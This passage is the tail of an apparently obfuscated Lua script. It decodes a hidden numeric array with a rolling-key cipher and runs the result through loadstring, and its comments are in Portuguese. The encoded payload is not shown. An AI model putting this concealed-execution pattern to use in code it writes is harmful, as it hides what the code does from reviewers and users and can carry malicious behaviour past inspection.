    local function VM_OOlI(d, k, m)
        local R_11IO0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_11IO0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_11IO0)
    end

    -- Execution Guard
    local F_IO0OlO = loadstring(VM_OOlI(B_Ill0OOlI, 28, 5))
    if F_IO0OlO then
        F_IO0OlO(...)
    end
end)(...)
